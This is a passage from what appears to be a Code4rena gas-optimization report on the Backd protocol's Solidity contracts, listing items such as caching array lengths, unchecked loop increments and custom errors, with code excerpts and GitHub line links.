https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L154  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  67:           _vestedBefore += vested; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L67  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  113:          totalStaked += staked;  135:          totalStaked -= unstaked;  148:              ammStakedIntegral += (currentRate * timeElapsed).scaledDiv(totalStaked); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L113  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  115               poolStakedIntegral += (currentRate * (block.timestamp - poolLastUpdate)).scaledDiv( 116                   poolTotalStaked 117:              ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L117  ### 8. `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 6 instances of this issue:* ```solidity File: protocol/contracts/AddressProvider.sol  433:      function _addKnownAddressKey(bytes32 key, AddressProviderMeta.Meta memory meta) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L433  ```solidity File: protocol/contracts/RewardHandler.sol  62:       function _approve(address token, address spender) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L62  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  146:      function _mintRewards(address beneficiary, uint256 amount) internal returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L146  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  96        function _depositInPool(address underlying_, ILiquidityPool pool_) 97            internal 98:           returns (uint256 received)  125:      function _swapperRouter() internal view returns (ISwapperRouter) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L96-L98  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  106:      function _mintRewards(address beneficiary, uint256 amount) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L106  ### 9. Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  63:           totalTime = endtime_ - starttime_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63  ### 10. `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 8 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  259:          for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  22:           for (uint256 i; i < newPools_.length; ++i) {  39:           for (uint256 i; i < oldPoolAddresses_.length; ) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ```solidity File: protocol/contracts/RewardHandler.sol  42:           for (uint256 i; i < pools.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  116:          for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L116  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  94:           for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L94  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  56:           for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56  ```solidity File: protocol/contracts/access/RoleManager.sol  82:           for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82  ### 11. `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  22:           for (uint256 i; i < newPools_.length; ++i) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ### 12. `require()`/`revert()` strings longer than 32 bytes cost extra gas  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/Minter.sol   #1  150           require( 151               issuedNonInflationSupply + amount <= nonInflationDistribution, 152               "Maximum non-inflation amount exceeded." 153:          ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L153  ### 13. Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**), and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  58:       mapping(address => bool) public strategies; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L58  ```solidity File: protocol/contracts/tokenomics/Minter.sol  41:       bool public initialPeriodEnded; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L41  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  31:       bool public weightBasedKeeperDistributionDeactivated;  41:       mapping(address => bool) public gauges; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L31  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  31:       bool public killed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L31  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  42:       bool public initializedSupply; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L42  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  37:       bool public override killed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L37  ### 14. Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol  91:           require(amount > 0, Error.INVALID_AMOUNT);  92:           require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  137:          require(length > 0, "No entries"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  104:          require(amount > 0, Error.INVALID_AMOUNT);  125:          require(amount > 0, Error.INVALID_AMOUNT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  84:           require(unallocatedSupply > 0, "No reward tokens in contract"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  140:          require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140  ### 15. Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead > When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol   #1  295:      function decimals() external view override returns (uint8) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L295  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol   #2  32:       uint48 public ammLastUpdated; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L32  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol   #3  34:       uint48 public lastUpdated; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L34  ### 16. Using `private` rather than `public` for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  *There are 11 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/Minter.sol  25:       uint256 public immutable initialAnnualInflationRateLp;  26:       uint256 public immutable annualInflationDecayLp;  30:       uint256 public immutable initialPeriodKeeperInflation;  31:       uint256 public immutable initialAnnualInflationRateKeeper;  32:       uint256 public immutable annualInflationDecayKeeper;  36:       uint256 public immutable initialPeriodAmmInflation;  37:       uint256 public immutable initialAnnualInflationRateAmm;  38:       uint256 public immutable annualInflationDecayAmm;  44:       uint256 public immutable nonInflationDistribution; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L25  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  37:       uint256 public immutable startTime;  38:       uint256 public immutable endTime; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L37  ### 17. Duplicated `require()`/`revert()` checks should be refactored to a modifier or function Saves deployment costs  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  223:          require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L223  ```solidity File: protocol/contracts/utils/Preparable.sol  98:           require(deadlines[key] != 0, Error.NOTHING_PENDING); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L98  ```solidity File: protocol/contracts/AddressProvider.sol  260:          require(!meta.frozen, Error.ADDRESS_FROZEN); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L260  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  270:              require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  365:          require(length == weights.length, "Invalid length of arguments"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L270  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  125:          require(amount > 0, Error.INVALID_AMOUNT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  76:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L76  ### 18. `require()` or `revert()` statements that check input arguments should be at the top of the function Checks that involve constants should come before checks that involve state variables  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/Controller.sol   #1  35:           require(_inflationManager != address(0), Error.INVALID_ARGUMENT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L35  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #2  60:           require(_minter != address(0), Error.INVALID_MINTER); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L60  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol   #3  54:           require(_recipient != treasury, "Treasury cannot be revoked!"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L54  ### 19. Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  31:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L31  ```solidity File: protocol/contracts/RewardHandler.sol   #2  30:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L30  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #3  35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ### 20. Use custom errors rather than `revert()`/`require()` strings to save deployment gas Custom errors are available from solidity version 0.8.4. The instances below match or exceed that version  *There are 109 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  66:           require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  76:           require(currentAddresses[_LP_GAUGE] == address(0), Error.ROLE_EXISTS);  99:           require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);  112:          require(msg.sender != account, Error.SELF_TRANSFER_NOT_ALLOWED);  113:          require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE);  145:          require(src != dst, Error.SAME_ADDRESS_NOT_ALLOWED);  154:          require(startingAllowance >= amount, Error.INSUFFICIENT_ALLOWANCE);  157:          require(srcTokens >= amount, Error.INSUFFICIENT_BALANCE);  202:          require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS);  223:          require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS);  323:          require(IERC20(token).balanceOf(msg.sender) >= amount, Error.INSUFFICIENT_BALANCE);  339:          require(staked == amount, Error.INVALID_AMOUNT);  366           require( 367               src == msg.sender || allowance_ >= amount || address(pool) == msg.sender, 368               Error.UNAUTHORIZED_ACCESS 369:          );  370:          require(balances[src] >= amount, Error.INSUFFICIENT_BALANCE); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L66  ```solidity File: protocol/contracts/Controller.sol  34:           require(address(inflationManager) == address(0), Error.ADDRESS_ALREADY_SET);  35:           require(_inflationManager != address(0), Error.INVALID_ARGUMENT);  82:           require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L34  ```solidity File: protocol/contracts/utils/Preparable.sol  28:           require(deadlines[key] == 0, Error.DEADLINE_NOT_ZERO);  29:           require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT);  86:           require(deadlines[key] != 0, Error.NOTHING_PENDING);  98:           require(deadlines[key] != 0, Error.NOTHING_PENDING);  110:          require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED);  111:          require(deadline != 0, Error.DEADLINE_NOT_SET); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L28  ```solidity File: protocol/contracts/BkdLocker.sol  59:           require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);  91:           require(amount > 0, Error.INVALID_AMOUNT);  92:           require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  119           require( 120               totalStashed[msg.sender] + amount <= balances[msg.sender], 121               "Amount exceeds locked balance" 122:          );  137:          require(length > 0, "No entries");  208           require( 209               _rewardToken == rewardToken || _replacedRewardTokens.contains(_rewardToken), 210               Error.INVALID_ARGUMENT 211:          ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L59  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  56:           require(lpTokenAmount_ != 0, "No LP Tokens");  57:           require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L56  ```solidity File: protocol/contracts/AddressProvider.sol  64:           require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED);  71:           require(_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_NOT_WHITELISTED);  98:           require(pool != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  102:          require(poolToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  176:          require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);  185:          require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);  199:          require(exists, Error.ADDRESS_DOES_NOT_EXIST);  241:          require(!meta.frozen, Error.ADDRESS_FROZEN);  242:          require(meta.freezable, Error.INVALID_ARGUMENT);  260:          require(!meta.frozen, Error.ADDRESS_FROZEN);  270:          require(!meta.frozen, Error.ADDRESS_FROZEN);  295:          require(token != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  296:          require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS);  325:          require(exists, Error.ADDRESS_NOT_FOUND);  428:          require(!_addressKeyMetas.contains(key), Error.INVALID_ARGUMENT);  434:          require(_addressKeyMetas.set(key, meta.toUInt()), Error.INVALID_ARGUMENT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L64  ```solidity File: protocol/contracts/tokenomics/Minter.sol  72:           require(_annualInflationDecayLp < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE);  73:           require(_annualInflationDecayKeeper < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE);  74:           require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE);  100:          require(address(token) == address(0), "Token already set!");  105:          require(lastEvent == 0, "Inflation has already started.");  132:          require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS);  150           require( 151               issuedNonInflationSupply + amount <= nonInflationDistribution, 152               "Maximum non-inflation amount exceeded." 153:          );  220:          require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L72  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  48:           require(gauges[msg.sender], Error.UNAUTHORIZED_ACCESS);  59:           require(minter == address(0), Error.ADDRESS_ALREADY_SET);  60:           require(_minter != address(0), Error.INVALID_MINTER);  95:           require(!weightBasedKeeperDistributionDeactivated, "Weight-based dist. deactivated.");  139:          require(_keeperGauges.contains(pool), Error.INVALID_ARGUMENT);  171:          require(length == weights.length, Error.INVALID_ARGUMENT);  174:              require(_keeperGauges.contains(pools[i]), Error.INVALID_ARGUMENT);  229:          require(gauges[IStakerVault(stakerVault).getLpGauge()], Error.GAUGE_DOES_NOT_EXIST);  244:          require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  265:          require(length == weights.length, "Invalid length of arguments");  270:              require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  295:              require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  315:          require(_ammGauges.contains(token), "amm gauge not found");  365:          require(length == weights.length, "Invalid length of arguments");  367:              require(_ammGauges.contains(tokens[i]), "amm gauge not found");  424:          require(!exists || keeperGauge != _keeperGauge, Error.INVALID_ARGUMENT);  452:          require(IAmmGauge(_ammGauge).isAmmToken(token), Error.ADDRESS_NOT_WHITELISTED);  484:          require(addressProvider.isStakerVault(msg.sender, lpToken), Error.UNAUTHORIZED_ACCESS);  486:          require(lpGauge != address(0), Error.GAUGE_DOES_NOT_EXIST);  621           require( 622               address(addressProvider.safeGetPoolForToken(lpToken)) != address(0), 623               Error.ADDRESS_NOT_FOUND 624:          ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L48  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  52:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  53:           require(revokedTime[_recipient] == 0, "Recipient already revoked");  54:           require(_recipient != treasury, "Treasury cannot be revoked!"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L52  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  50:           require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS);  57            require( 58                msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender), 59                Error.UNAUTHORIZED_ACCESS 60:           );  104:          require(amount > 0, Error.INVALID_AMOUNT);  125:          require(amount > 0, Error.INVALID_AMOUNT);  126:          require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L50  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  57:           require(starttime_ >= block.timestamp, "start must be future");  58:           require(endtime_ > starttime_, "end must be greater");  69:           require(_admin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  70:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  75:           require(_fundadmin != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  76:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  81:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  82:           require(!initializedSupply, "Supply already initialized once");  84:           require(unallocatedSupply > 0, "No reward tokens in contract");  90:           require(msg.sender == fundAdmin || msg.sender == admin, Error.UNAUTHORIZED_ACCESS);  91:           require(initializedSupply, "Supply must be initialized"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L57  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  40:           require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS);  78            require( 79                IController(controller).addressProvider().isWhiteListedFeeHandler(msg.sender), 80                Error.ADDRESS_NOT_WHITELISTED 81:           );  82:           require(!killed, Error.CONTRACT_PAUSED);  126           require( 127               msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender), 128               Error.UNAUTHORIZED_ACCESS 129:          );  140:          require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L40  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  49:           require(tokens_.length != 0, "No tokens to burn");  75:           require(burningEth_ || msg.value == 0, Error.INVALID_VALUE); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L49  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  31:           require(_stakerVault != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  35:           require(address(_inflationManager) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  53            require( 54                msg.sender == beneficiary || _roleManager().hasRole(Roles.GAUGE_ZAP, msg.sender), 55                Error.UNAUTHORIZED_ACCESS 56:           ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L31  ```solidity File: protocol/contracts/tokenomics/BkdToken.sol  31:           require(msg.sender == minter, Error.UNAUTHORIZED_ACCESS); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/BkdToken.sol#L31  ```solidity File: protocol/contracts/access/RoleManager.sol  28:           require(hasRole(Roles.GOVERNANCE, msg.sender), Error.UNAUTHORIZED_ACCESS);  46:           require(getRoleMemberCount(Roles.GOVERNANCE) > 1, Error.CANNOT_REVOKE_ROLE);  112:          require(role != Roles.GOVERNANCE, Error.CANNOT_REVOKE_ROLE);  113:          require(hasRole(role, account), Error.INVALID_ARGUMENT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L28  ### 21. Functions guaranteed to revert when called by normal users can be marked `payable` If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are  `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  *There are 53 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  75:       function initializeLpGauge(address _lpGauge) external override onlyGovernance returns (bool) {  82:       function prepareLpGauge(address _lpGauge) external override onlyGovernance returns (bool) {  87:       function executeLpGauge() external override onlyGovernance returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L75  ```solidity File: protocol/contracts/Controller.sol  33:       function setInflationManager(address _inflationManager) external onlyGovernance {  39        function addStakerVault(address stakerVault) 40            external 41            override 42            onlyRoles2(Roles.GOVERNANCE, Roles.POOL_FACTORY) 43:           returns (bool)  62:       function removePool(address pool) external override onlyGovernance returns (bool) {  81:       function 